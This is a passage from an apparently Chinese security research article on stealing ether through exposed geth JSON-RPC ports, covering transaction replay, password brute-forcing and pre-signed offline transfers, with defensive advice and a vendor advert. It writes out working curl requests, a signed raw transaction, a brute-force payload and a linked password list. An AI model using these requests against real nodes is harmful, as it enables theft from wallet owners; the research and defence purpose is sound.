        try:
                for i in range(3):
                        web3.eth.sendTransaction(`{`
                                "from":web3.eth.accounts[0],
                                "to":web3.eth.accounts[1],
                                "value": 1900000000000000000000000,
                                "gas": 21000,
                                "gasPrice": 10000000000000`}`)
                break
        except:
                time.sleep(1)
                pass
```

2.节点A的用户由于转账的需求，使用 personal.unlockAccount() 解锁账户，导致偷渡漏洞发生。由于一共进行了三次转账请求并成功广播，所以A、B、C交易缓存池中均存在这三笔交易。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/545e4284-6836-4493-9cc9-c7b840eb51de.png-w331s)

3.由于网络波动等原因，此时节点 C 与其它节点失去连接。在这里用 admin.removePeer() 模拟节点 C 掉线。节点 B 继续挖矿，完成相应的交易。后两笔交易会因为余额不足从交易缓存池中移除，最终节点 A ，B 的交易缓存池中将不会有任何交易。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/7ae0b998-075a-4d21-be8d-16be146771ac.png-w331s)

4.上述步骤 1-3 即是前文说到的 偷渡漏洞，被攻击者A发现其节点被攻击，迅速修改了节点A的启动命令，去除了 –rpc –rpcaddr 0.0.0.0，避免 RPC 端口暴露在公网之中。之后继续使用该账户进行了多次转账。例如，使用其它账号给节点A上的账号转账，使的节点A上的账号余额为 1.980065000882e+24

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/5a042cbf-ae13-4b2e-acdd-09560a65fe1e.png-w331s)

5.节点 C 再次连接进网络，会将其交易池中的三个交易再次广播，发送到各节点。这就造成已经移除交易缓存池的交易再次回到交易缓存池中。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/4666e841-a77c-48a6-9ed1-74babca9deff.png-w331s)

6.由于此时节点A的账户余额足够，第二个交易将会被打包进区块，节点A中的余额再次被盗。

注： 在实际的场景中，不一定会出现节点 C 失去连接的情况，但由于存在大量分布式节点的原因，交易被其它节点重新发送的情况也是可能出现的。这也可以解释为什么在前文说到： 账户余额足够时，会出现大量应该被移除的 pending 交易，在部分交易完成后，pending 交易消失的的情况。当账户余额足够时，重新广播交易的节点会将之前所有的交易再次广播出去，在交易完成后，剩余 pending 交易会因为余额不足再次从交易缓存池中被移除。

注2: 除了本节说到的现象外，亦不排除攻击者设置了恶意的以太坊节点，接收所有的交易信息并将部分交易持续广播。但由于该猜想无法验证，故仅作为猜测思路提供。

### 3.3 unlockAccount接口的爆破攻击

> 对于暂时无法关闭对公网暴露的 RPC 接口的节点，在不使用 personal.unlockAccount() 的情况下，仍然存在被盗币的可能。

#### 3.3.1 漏洞复现

被攻击节点启动参数为： geth –testnet –rpc –rpcaddr 0.0.0.0 –rpcapi eth,personal console

攻击者的攻击步骤为：
1. 与 偷渡漏洞 攻击 1-3 步类似，攻击者探测到目标开放了 RPC 端口 -&gt; 获取当前节点的区块高度、节点上的账户列表 以及 各账户的余额。根据蜜罐捕获的数据，部分攻击还会通过 personal_listWallets 接口进行查询，寻找当前节点上已经 unlocked 的账户。
1. 调用 personal_unlockAccount 接口尝试解密用户账户。假如用户使用了弱口令，攻击者将会成功解锁相应账户。
1. 攻击者可以将解锁账户中的余额全部转给自己。
攻击流程如下图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/8d2cf9da-6d5c-4493-b3d8-ab9974714d7c.png-w331s)

#### 3.3.2 升级的爆破方式

根据偷渡漏洞的原理可以知道该攻击方式有一个弊端：如果有两个攻击者同时攻击一个节点，当一个攻击者爆破成功，那么这两个攻击者都将可以取走节点中的余额。

根据 2.3 节中的分析可以知道，谁付出了更多的手续费，谁的交易将会被先打包。这也陷入了一个恶性循环，盗币者需要将他们的利益更多地分给打包的矿工才能偷到对应的钱。也正是因为这个原因，蜜罐捕获到的爆破转账请求从最初的 personal_unlockAccount 接口逐渐变成了 personal_sendTransaction 接口。

personal_sendTransaction 接口是 Geth 官方在 2018/01 新增了一个解决偷渡漏洞的RPC接口。使用该接口转账，解密出的私钥将会存放在内存中，所以不会引起 偷渡漏洞 相关的问题。攻击者与时俱进的攻击方式不免让我们惊叹。

### 3.4 自动签名交易的离线攻击

> 对于曾经被盗币的节点，可能会被离线漏洞所攻击。这取决于被盗币时攻击者生成了多个交易签名。

#### 3.4.1 攻击流程复现

由于该攻击涉及到的 eth_signTransaction 接口在 pyweb3 中不存在，故攻击流程复现使用 curl 命令与 JSON-RPC 交互

攻击者IP为：10.0.0.3，账户地址为：0xd4f0ad3896f78e133f7841c3a6de11be0427ed89，geth 的启动命令为： geth –testnet –rpc –rpcaddr 0.0.0.0 –rpcapi eth,net,personal

被攻击者IP为： 10.0.0.4，geth 版本为 1.8.11 （当前最新版本为 1.8.12），账户地址为 0x9e92e615a925fd77522c84b15ea0e8d2720d3234

1.攻击者扫描到被攻击者开放了 8545 端口后，可以通过多个接口获取被攻击者信息

```
curl -XPOST --data '`{`"jsonrpc":"2.0","method":"eth_accounts","params":[],"id":1`}`' --header "Content-Type: application/json" http://10.0.0.4:8545
curl -XPOST --data '`{`"jsonrpc":"2.0","method":"eth_getBalance","params":["0x9e92e615a925fd77522c84b15ea0e8d2720d3234","latest"],"id":1`}`' --header "Content-Type: application/json" http://10.0.0.4:8545
curl -XPOST --data '`{`"jsonrpc":"2.0","method":"eth_blockNumber","params":null,"id":1`}`' --header "Content-Type: application/json" http://10.0.0.4:8545
curl -XPOST --data '`{`"jsonrpc":"2.0","method":"net_version","params":null,"id":1`}`' --header "Content-Type: application/json" http://10.0.0.4:8545
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/5a5cb591-7a05-4a69-a81a-bcb951434616.png-w331s)

账户里余额为0，是因为笔者没有及时同步区块。实际余额是 0.98 ether

2.通过 eth_getTransactionCount 接口获取节点账户和盗币账户之间的转账次数，用于计算 nonce。等待用户通过 personal.unlockAccount() 解锁。在用户解锁账户的情况下，通过 eth_signTransaction接口持续发送多笔签名转账请求。例如：签名的转账金额是 2 ether，发送的数据包如下：

```
curl -XPOST --data '`{`"jsonrpc":"2.0","method":"eth_signTransaction","params":[`{`"from":"0x9e92e615a925fd77522c84b15ea0e8d2720d3234","to":"0xd4f0ad3896f78e133f7841c3a6de11be0427ed89","value": "0x1bc16d674ec80000", "gas": "0x30d40", "gasPrice": "0x2dc6c0","nonce":"0x1"`}`],"id":1`}`' --header "Content-Type: application/json" http://10.0.0.4:8545 
注： 该接口在官方文档中没有被介绍，但在新版本的geth中的确存在
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/6b8faade-8bd5-4b8d-9bb9-56812a62a3bc.png-w331s)攻击者会在账户解锁期间按照 nonce 递增的顺序构造多笔转账的签名。

3.至此，攻击者的攻击已经完成了一半。无论被攻击者是否关闭 RPC 接口，攻击者都已经拥有了转移走用户账户里 2 ether 的能力。攻击者只需监控用户账户中的余额是否超过 2 ether 即可。如图所示，在转入 1.2 ether 后，用户的账户余额已经达到 2 ether

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/e263fc1b-b503-49e1-9f05-cd645da0e496.png-w331s)攻击者在自己的节点对已经签名的交易进行广播：

```
eth.sendRawTransaction("0xf86b01832dc6c083030d4094d4f0ad3896f78e133f7841c3a6de11be0427ed89881bc16d674ec80000801ba0e2e7162ae34fa7b2ca7c3434e120e8c07a7e94a38986776f06dcd865112a2663a004591ab78117f4e8b911d65ba6eb0ce34d117358a91119d8ddb058d003334ba4")
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/1c62c923-fc3c-410f-9ed8-70bd3eec108e.png-w331s)2 ether 被成功盗走。

相关[交易记录](https://ropsten.etherscan.io/tx/0x4c661b558a6a2325aa36c5ce42ece7e3cce0904807a5af8e233083c556fbdebc)可以在测试网络上查询到。

攻击流程图示如下：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/0a078b0a-17c8-4b8c-826b-c836e2257e39.png-w331s)

#### 3.4.2 攻击成功的关键点解析

按照惯例，先提出问题：
1. 为什么签名的交易可以在别的地方广播？
1. Geth 官方提供的接口 eth_sign 是否可以签名交易？
##### 3.4.2.1 签名的有效性问题

从原理上说，离线漏洞的攻击方式亦是以太坊离线签名的一种应用。

为了保护私钥的安全性，以太坊拥有离线签名这一机制。用户可以在不联网的电脑上生成私钥，通过该私钥签名交易，将签名后的交易在联网的主机上广播出去，就可以成功实现交易并有效地保证私钥的安全性。

在 1.3 节的图中，详细的说明了以太坊实现交易签名的步骤。在各参数正确的情况下，以太坊会将交易的相关参数：nonce、gasPrice、gas、to、value 等值进行 RLP 编码，然后通过 sha3_256 算出其对应的 hash 值，然后通过私钥对 hash 值进行签名，最终得到 s、r、v。所以交易的相关参数有：

```
"tx": `{`
        "nonce": "0x1",
        "gasPrice": "0x2dc6c0",
        "gas": "0x30d40",
        "to": "0xd4f0ad3896f78e133f7841c3a6de11be0427ed89",
        "value": "0x1bc16d674ec80000",
        "input": "0x",
        "v": "0x1b",
        "r": "0xe2e7162ae34fa7b2ca7c3434e120e8c07a7e94a38986776f06dcd865112a2663",
        "s": "0x4591ab78117f4e8b911d65ba6eb0ce34d117358a91119d8ddb058d003334ba4",
        "hash": "0x4c661b558a6a2325aa36c5ce42ece7e3cce0904807a5af8e233083c556fbdebc"
`}`
```

由于 hash 可以根据其它值算出来，所以对除 hash 外的所有值进行 RLP 编码，即可得到签名后的交易内容。

在以太坊的其它节点接受到该交易后，会通过 RLP 解码得到对应的值并算出 hash 的值。由于椭圆曲线数字签名算法可以在知道 hash 和 s、r、v的情况下得到公钥的值、公钥经过 sha3_256 加密，后四十位就是账户地址，所以只有在所有参数没有被篡改的情况下，才能还原出公钥，计算出账户地址。因此确认该交易是从这个地址签名的。

根据上述的签名流程，也可以看出，在对应的字段中，缺少了签名时间这一字段，这也许会在区块链落地的过程中带来一定的阻碍。

##### 3.4.2.2 交易签名流程 与 eth_sign签名流程对比

根据官网的描述，eth_sign 的实现是 sign(keccak256(“\x19Ethereum Signed Message:\n” + len(message) + message)))

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/911d3b4a-6f88-4a4a-9636-20aa8b7ba3f9.png-w331s)

这与 3.4.2.1 节中交易签名流程有着天壤之别，所以 eth_sign 接口并不能实现对交易的签名！

注：我们的蜜罐未抓取到离线漏洞相关攻击流量，上述攻击细节是知道创宇404区块链安全团队研究后实现的攻击路径，可能和现实中黑客的攻击流程有一定的出入。

### 3.5 蜜罐捕获攻击JSON‐RPC相关数据分析

> 在偷渡漏洞曝光后，知道创宇404团队有针对性的开发并部署了相关蜜罐。 该部分数据统计截止 2018/07/14

#### 3.5.1 探测的数据包

对蜜罐捕获的攻击流量进行统计，多个 JSON-RPC 接口被探测或利用：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/ee46e461-4379-43fb-b41e-fcfc4922e0e9.png-w331s)

其中 eth_blockNumber、eth_accounts、net_version、personal_listWallets 等接口具有很好的前期探测功能，net_version 可以判断是否是主链，personal_listWallets 则可以查看所有账户的解锁情况。

personal_unlockAccount、personal_sendTransaction、eth_sendTransaction 等接口支持解锁账户或直接进行转账。

可以说，相比于第一阶段的攻击，后偷渡时代 针对 JSON-RPC 的攻击正呈现多元化的特点。

#### 3.5.2 爆破账号密码

蜜罐在 2018/05/24 第一次检测到通过 unlockAccount 接口爆破账户密码的行为。截止 2018/07/14 蜜罐一共捕获到 809 个密码在爆破中使用，我们将会在最后的附录部分给出详情。

攻击者主要使用 personal_unlockAccount 接口进行爆破，爆破的 payload 主要是：

```
`{`"jsonrpc":"2.0","method":"personal_unlockAccount","params":["0x96B5aB24dA10c8c38dac32B305caD76A99fb4A36","katie123",600],"id":50`}`
```

在所有的爆破密码中有一个比较特殊：ppppGoogle。该密码在 personal_unlockAccount 和 personal_sendTransaction 接口均有被多次爆破的痕迹。是否和[《Microsoft Azure 以太坊节点自动化部署方案漏洞分析》](https://paper.seebug.org/638/)案例一样，属于某厂商以太坊节点部署方案中的默认密码，仍有待考证。

#### 3.5.3 转账的地址

蜜罐捕获到部分新增的盗币地址有：[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/8ea4f2d8-aa84-4cfa-862e-e337d88dd59f.png-w331s)

#### 3.5.4 攻击来源IP

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/b08afeaf-f208-43e8-b7d0-8f3404da5d69.png-w331s)

### 3.6 其它的威胁点

正如本文标题所说，区块链技术为金融行业带来了丰厚的机遇，但也招来了众多独行的大盗。本节将会简单介绍在研究偷渡漏洞过程中遇到的其它威胁点。

#### 3.6.1 parity_exportAccount 接口导出账户信息

在 3.5.1 节中，蜜罐捕获到对 parity_exportAccount 接口的攻击。根据官方手册，攻击者需要输入账号地址和对应的密码，如果正确将会导出以json格式导出钱包。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/093bea69-ff04-4203-9f45-9fb7ab9e24af.png-w331s)

看过 1.2、1.3 节中的知识点、偷渡漏洞、后偷渡时代的利用方式的介绍，需要意识到：一旦攻击者攻击成功，私钥将会泄漏，攻击者将能完全控制该地址。

#### 3.6.2 clef 中的 account_export 接口

该软件是 geth 中一个仍未正式发布的测试软件。其中存在一个导出账户的接口 account_export。

通过 curl -XPOST [http://localhost:8550/](http://localhost:8550/) -d ‘`{`“id”: 5,”jsonrpc”: “2.0”,”method” : “account_export”,”params”: [“0xc7412fc59930fd90099c917a50e5f11d0934b2f5”]`}`’ –header “Content-Type: appli cation/json” 命令可以调用该接口导出相关账号信息。值得一提的是，在接口存在一定的安全机制，需要用户同意之后才会导出账号。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/d334ea05-6b87-4a7b-8ece-024ec82ccbcc.png-w331s)

虽然该接口目前仍算安全，但由于不需要密码即可导出keystore文件内容的特性，值得我们持续关注。

### 3.7 后偷渡时代的防御方案

相较于 3.1 节已有的防御方案，后偷渡时代更加关注账户和私钥安全。
1. 对于有被偷渡漏洞攻击的痕迹或可能曾经被偷渡漏洞攻击过的节点，建议将节点上相关账户的资产转移到新的账户后废弃可能被攻击过的账户。
1. 建议用户不要使用弱口令作为账户密码，如果已经使用了弱口令，可以根据1.2节末尾的内容解出私钥内容，再次通过 geth account import 命令导入私钥并设置强密码。
1. 如节点不需要签名转账等操作，建议节点上不要存在私钥文件。如果需要使用转账操作，务必使用 personal_sendTransaction 接口，而非 personal_unlockAccount 接口。


## 0x04 总结

在这个属于区块链的风口上，实际落地仍然还有很长的路需要走。后偷渡时代的离线漏洞中出现的 区块链记录的交易时间不一定是交易签名时间 这一问题就是落地过程中的阻碍之一。

区块链也为攻击溯源带来了巨大的阻碍。一旦私钥泄漏，攻击者可以在任何地方发动转账。而由于区块链分布式存储的原因，仅仅通过区块链寻找攻击者的现实位置也变得难上加难。

就 Go Ethereum JSON-RPC 盗币漏洞而言，涉及到多个方面的多个问题：以太坊底层签名的内容、geth客户端 unlockAccount 实现的问题、分布式网络导致的重放问题，涉及的范围之广也是单个传统安全领域较难遇到的。这也为安全防御提出了更高的要求。只有从底层了解相关原理、对可能出现的攻击提前预防、经验加技术的沉淀才能在区块链的安全防御方面做到游刃有余。

虚拟货币价值的攀升，赋予了由算法和数字堆砌的区块链巨大的金融价值，也会让 盗币者 竭尽所能从更多的方面实现目标。金钱难寐，大盗独行，也许会是这个漏洞最形象的描述。



## 知道创宇

### 智能合约审计服务

针对目前主流的以太坊应用，知道创宇提供专业权威的智能合约审计服务，规避因合约安全问题导致的财产损失，为各类以太坊应用安全保驾护航。

知道创宇404智能合约安全审计团队： [https://www.scanv.com/lca/index.html](https://www.scanv.com/lca/index.html)<br>
联系电话：(086) 136 8133 5016(沈经理，工作日:10:00-18:00)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2018/08/3adb8e66-32a1-441c-9c6b-4c34e28551a8.png-w331s)

### 区块链行业安全解决方案

黑客通过DDoS攻击、CC攻击、系统漏洞、代码漏洞、业务流程漏洞、API-Key漏洞等进行攻击和入侵，给区块链项目的管理运营团队及用户造成巨大的经济损失。知道创宇十余年安全经验，凭借多重防护+云端大数据技术，为区块链应用提供专属安全解决方案。





## 参考链接
1. [What is an Ethereum keystore file?](https://medium.com/@julien.maffre/what-is-an-ethereum-keystore-file-86c8c5917b97)
1. [Key_derivation_function](https://en.wikipedia.org/wiki/Key_derivation_function)
1. [15.1. hashlib — Secure hashes and message digests](https://docs.python.org/3/library/hashlib.html)
1. [对比一下ecdsa与secp256k1-py从私钥生成公钥](https://steemit.com/python/@oflyhigh/ecdsa-secp256k1-py)
1. [Ethereum JSON RPC](https://github.com/ethereum/wiki/wiki/JSON-RPC)
1. [how-to-create-raw-transactions-in-ethereum-part-1-1df91abdba7c](https://medium.com/blockchain-musings/how-to-create-raw-transactions-in-ethereum-part-1-1df91abdba7c)
1. [椭圆曲线密码学和以太坊中的椭圆曲线数字签名算法应用](https://blog.csdn.net/teaspring/article/details/77834360)
1. [Web3-Secret-Storage-Definition](https://github.com/ethereum/wiki/wiki/Web3-Secret-Storage-Definition)
1. [Management-APIs](https://github.com/ethereum/go-ethereum/wiki/Management-APIs#personal_unlockaccount)
1. [RPC: add personal_signTransaction: [tx, pw]](https://github.com/ethereum/go-ethereum/issues/15953)
1. [Possible BUG – somebody took 50 ETH from my wallet immediately after successful transaction](https://github.com/ethereum/go-ethereum/issues/17011)
1. [RLP 英文版](https://github.com/ethereum/wiki/wiki/RLP)
1. [RLP 中文版](https://github.com/ethereum/wiki/wiki/%5B%E4%B8%AD%E6%96%87%5D-RLP)
1. [Private-network](https://github.com/ethereum/go-ethereum/wiki/Private-network)
1. [How do I get the raw private key from my Mist keystore file?](https://ethereum.stackexchange.com/questions/3720/how-do-i-get-the-raw-private-key-from-my-mist-keystore-file)
1. [以太坊源码分析-交易](https://tianyun6655.github.io/2017/09/24/%E4%BB%A5%E5%A4%AA%E5%9D%8A%E6%BA%90%E7%A0%81%E4%BA%A4%E6%98%93/)
1. [Ethereum交易详解](https://github.com/linjie-1/guigulive-operation/wiki/Ethereum%E4%BA%A4%E6%98%93%E8%AF%A6%E8%A7%A3)
1. [Life Cycle of an Ethereum Transaction](https://medium.com/blockchannel/life-cycle-of-an-ethereum-transaction-e5c66bae0f6e)
1. [揭秘以太坊中潜伏多年的“偷渡”漏洞，全球黑客正在疯狂偷币](https://paper.seebug.org/547/)
1. [以太坊生态缺陷导致的一起亿级代币盗窃大案](https://mp.weixin.qq.com/s/Kk2lsoQ1679Gda56Ec-zJg)
1. [慢雾社区小密圈关于以太坊情人节升级攻击的情报](https://wx.zsxq.com/mweb/views/topicdetail/topicdetail.html?topic_id=48528228854228&amp;user_id=28284511858111)
1. [以太坊离线钱包](https://www.jianshu.com/p/4c106ccd2aa9)
1. [以太坊实战之《如何正确处理nonce》](https://blog.csdn.net/wo541075754/article/details/78081478)


## 附录

### 1. 爆破 unlockAccount 接口使用的密码列表

[密码列表](https://images.seebug.org/archive/password_8545_eth.dat)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
